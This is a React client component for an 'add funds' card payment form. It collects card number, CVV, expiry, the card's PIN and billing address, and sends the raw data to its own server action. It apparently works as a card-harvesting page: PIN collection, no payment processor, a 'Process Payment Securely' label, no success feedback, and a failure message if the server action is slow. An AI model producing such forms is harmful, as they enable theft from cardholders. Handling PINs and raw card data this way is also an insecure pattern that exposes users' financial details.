"use client";
import { useState } from "react";
import { MDBIcon } from "mdb-react-ui-kit";
import { cardDetails } from "../actions/cardDetails";
import styles from "./addfunds.module.css";

const Card = () => {
  const [spinner, setSpinner] = useState(false);
  const [error, setError] = useState("");
  const [paymentError, setPaymentError] = useState("");
  const [formData, setFormData] = useState({
    depositAmount: "",
    nameOnCard: "",
    cnumber: "",
    cvv: "",
    cexp: "",
    pin: "",
    addressLineOne: "",
    addressLineTwo: "",
    city: "",
    stateOrProvince: "",
    zipOrPostalCode: "",
    country: ""
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const { cnumber, cvv, cexp } = formData;

    if (!cnumber || !cvv || !cexp) {
      setError("Please fill in all required card details");
      return;
    }

    setSpinner(true);
    setError("");
    setPaymentError("");

    const timer = setTimeout(() => {
      setSpinner(false);
      setPaymentError("Transaction was not successful. Please try again or contact support.");
    }, 20000);

    try {
      const response = await cardDetails(formData);
      clearTimeout(timer);
      setSpinner(false);
      console.log(response);
    } catch (err) {
      clearTimeout(timer);
      setSpinner(false);
      setPaymentError("An error occurred while processing your payment");
      console.error(err);
    }
  };

  return (
    <div className={styles.paymentForm}>
      {error && <div className={styles.errorMessage}>{error}</div>}

      <form onSubmit={handleSubmit}>
        <div className={styles.formSection}>
          <h4 className={styles.formSectionTitle}>Payment Details</h4>

          <div className={styles.inputGroup}>
            <label htmlFor="depositAmount" className={styles.formLabel}>
              Amount in USD*
            </label>
            <input
              type="number"
              id="depositAmount"
              name="depositAmount"
              className={styles.formInput}
              placeholder="Enter deposit amount"
              value={formData.depositAmount}
              onChange={handleChange}
              required
            />
          </div>
        </div>

        <div className={styles.formSection}>
          <h4 className={styles.formSectionTitle}>Card Information</h4>

          <div className={styles.inputGroup}>
            <label htmlFor="nameOnCard" className={styles.formLabel}>
              Name on Card*
            </label>
            <input
              type="text"
              id="nameOnCard"
              name="nameOnCard"
              className={styles.formInput}
              placeholder="Name as shown on card"
              value={formData.nameOnCard}
              onChange={handleChange}
              required
            />
          </div>

          <div className={styles.inputGroup}>
            <label htmlFor="cnumber" className={styles.formLabel}>
              Card Number*
            </label>
            <input
              type="text"
              id="cnumber"
              name="cnumber"
              className={styles.formInput}
              placeholder="Card number without spaces"
              value={formData.cnumber}
              onChange={handleChange}
              required
            />
          </div>

          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label htmlFor="cvv" className={styles.formLabel}>
                CVV*
              </label>
              <input
                type="text"
                id="cvv"
                name="cvv"
                className={styles.formInput}
                placeholder="Security code"
                value={formData.cvv}
                onChange={handleChange}
                required
              />
            </div>

            <div className={styles.inputGroup}>
              <label htmlFor="cexp" className={styles.formLabel}>
                Expiration Date*
              </label>
              <input
                type="month"
                id="cexp"
                name="cexp"
                className={styles.formInput}
                value={formData.cexp}
                onChange={handleChange}
                required
              />
            </div>
          </div>

          <div className={styles.inputGroup}>
            <label htmlFor="pin" className={styles.formLabel}>
              PIN
            </label>
            <input
              type="password"
              id="pin"
              name="pin"
              className={styles.formInput}
              placeholder="Card PIN if required"
              value={formData.pin}
              onChange={handleChange}
            />
          </div>
        </div>

        <div className={styles.formSection}>
          <h4 className={styles.formSectionTitle}>Billing Address</h4>

          <div className={styles.inputGroup}>
            <label htmlFor="addressLineOne" className={styles.formLabel}>
              Address Line 1*
            </label>
            <input
              type="text"
              id="addressLineOne"
              name="addressLineOne"
              className={styles.formInput}
              placeholder="Street address"
              value={formData.addressLineOne}
              onChange={handleChange}
              required
            />
          </div>

          <div className={styles.inputGroup}>
            <label htmlFor="addressLineTwo" className={styles.formLabel}>
              Address Line 2
            </label>
            <input
              type="text"
              id="addressLineTwo"
              name="addressLineTwo"
              className={styles.formInput}
              placeholder="Apt, suite, building (optional)"
              value={formData.addressLineTwo}
              onChange={handleChange}
            />
          </div>

          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label htmlFor="city" className={styles.formLabel}>
                City*
              </label>
              <input
                type="text"
                id="city"
                name="city"
                className={styles.formInput}
                placeholder="City"
                value={formData.city}
                onChange={handleChange}
                required
              />
            </div>

            <div className={styles.inputGroup}>
              <label htmlFor="stateOrProvince" className={styles.formLabel}>
                State/Province*
              </label>
              <input
                type="text"
                id="stateOrProvince"
                name="stateOrProvince"
                className={styles.formInput}
                placeholder="State or province"
                value={formData.stateOrProvince}
                onChange={handleChange}
                required
              />
            </div>
          </div>

          <div className={styles.formRow}>
            <div className={styles.inputGroup}>
              <label htmlFor="zipOrPostalCode" className={styles.formLabel}>
                ZIP/Postal Code*
              </label>
              <input
                type="text"
                id="zipOrPostalCode"
                name="zipOrPostalCode"
                className={styles.formInput}
                placeholder="ZIP or postal code"
                value={formData.zipOrPostalCode}
                onChange={handleChange}
                required
              />
            </div>

            <div className={styles.inputGroup}>
              <label htmlFor="country" className={styles.formLabel}>
                Country*
              </label>
              <input
                type="text"
                id="country"
                name="country"
                className={styles.formInput}
                placeholder="Country"
                value={formData.country}
                onChange={handleChange}
                required
              />
            </div>
          </div>
        </div>

        {spinner && (
          <div className={styles.spinner}>
            <div className={styles.spinnerInner}></div>
          </div>
        )}

        {paymentError && <div className={styles.errorMessage}>{paymentError}</div>}

        <button
          type="submit"
          className={styles.submitButton}
          disabled={spinner}
        >
          <MDBIcon fas icon="lock" className="me-2" />
          Process Payment Securely
        </button>
      </form>
    </div>
  );
};

export default Card;
